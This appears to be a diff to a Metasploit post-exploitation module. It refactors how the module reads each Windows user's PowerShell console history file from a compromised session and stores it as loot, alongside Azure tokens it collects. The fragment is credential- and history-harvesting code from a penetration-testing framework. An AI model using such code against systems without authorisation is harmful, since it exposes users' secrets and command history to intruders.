@@ -165,19 +165,20 @@ class MetasploitModule < Msf::Post
           tokens_table << result
         end
       end
-    end
 
-    # windows only
-    if session.platform == 'windows'
+      # windows only
+      next unless session.platform == 'windows'
+
       vprint_status('  Checking for console history files')
-      ['%USERPROFILE%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt'].each do |file_location|
-        next unless exists?(file_location)
+      %w[AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt].each do |file_location|
+        possible_location = ::File.join(user_directory, file_location)
+        next unless exists?(possible_location)
 
-        data = read_file(file_location)
+        data = read_file(possible_location)
         next unless data
 
-        loot = store_loot 'azure.console_history.txt', 'text/plain', session, data, file_location, 'Azure CLI Profile'
-        print_good "    #{file_location} stored in #{loot}"
+        loot = store_loot 'azure.console_history.txt', 'text/plain', session, data, possible_location, 'Azure CLI Profile'
+        print_good "    #{possible_location} stored in #{loot}"
 
         results = print_consolehost_history(data)
         results.each do |result|
